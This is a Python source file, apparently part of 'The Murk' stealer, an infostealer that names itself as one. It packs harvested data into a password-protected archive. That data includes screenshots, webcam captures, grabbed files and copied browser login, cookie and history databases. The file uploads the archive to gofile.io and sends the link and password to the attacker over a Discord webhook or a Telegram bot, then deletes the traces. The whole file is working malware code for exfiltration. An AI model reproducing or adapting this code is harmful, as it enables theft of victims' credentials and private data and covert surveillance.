#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from shutil import make_archive,rmtree
from requests import post, get
from os import getenv,sep,chdir,remove,rmdir
from manager.logger import Log
from random import randint
from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
import json

def upload_file_to_gofile(file_path):
	try:
		server = get("https://api.gofile.io/getServer")
		if server.status_code == 200:
			json = server.json()
			server = json.get("data").get("server")
		url = f"https://{server}.gofile.io/uploadFile"
		response = post(url, files={"upload_file": open(file_path, "rb")})
		if response.status_code == 200:
			json_data = response.json()
			if json_data.get("status") == "ok":
				return json_data["data"]["downloadPage"]
	except Exception as e:
		Log(f"gofile ---> {e}")
		return None

def MakeZip(local):
	dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
	pwd_str = ""
	name = ""
	for i in range (40):
		name += dox[randint(0,len(dox)-1)]
	for i in range (60):
		pwd_str += dox[randint(0,len(dox)-1)]
	password = bytes(pwd_str, "UTF-8")
	
	chdir(local)
	make_archive(fr'{local}\logs', 'zip', fr'{local}\windll')
	with AESZipFile(f'{name}.zip','w',compression=ZIP_STORED,encryption=WZ_AES) as logs:
		logs.setpassword(password)
		logs.write(r'logs.zip')
	remove("logs.zip")
	return[f"{local}/{name}.zip",pwd_str]

def Clean(local, roaming):
	rmtree(rf'{local}\windll\File-Grubber', ignore_errors=True)
	rmtree(rf'{local}\windll', ignore_errors=True)
	try:
		remove(rf'{local}\windll\sreenshot.jpg')
		remove(rf'{local}\windll\webcam.png')
	except:
		pass
	try:
		remove(roaming+"/Loginvault.db")
		remove(roaming+'/cookies.db')
		remove(roaming+'/history.db')
		remove(local+'/IconCache.db')
	except:
		pass

def MsgForDiscord(message):
	message = message.replace('<b>', '**')
	message = message.replace('</b>', '**')
	message = message.replace('<code>', '```')
	message = message.replace('</code>', '```')
	message = message.replace('<u>', '__')
	message = message.replace('</u>', '__')
	message = message.replace('<i>', '*')
	message = message.replace('</i>', '*')
	return message




def Send(sendData, msgInfo):
	local = getenv('LOCALAPPDATA')
	roaming = getenv('APPDATA')
	zipInfo = []
	Log("===========Conclusion===========")

	try:
		zipInfo = MakeZip(local)
	except Exception as error:
		Log(f"MakeZip ---> {error}")
	Clean(local,roaming)

	url = upload_file_to_gofile(f'{zipInfo[0]}')
	remove(f'{zipInfo[0]}')
	print(url)
	
	message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n<a href=\"{url}\">🔗Link</a>\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"

	if sendData[0] == 0:
		message = MsgForDiscord(message)
		message+="\n\n\n**The Murk|by Nick Vinesmoke**"
		message+="\n@everyone"
		post(sendData[1], data=json.dumps({"content": message}), headers={'Content-Type': 'application/json'})
	if sendData[0] == 1:
		message+="\n\n\n<b>The Murk|by Nick Vinesmoke</b>"
		post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})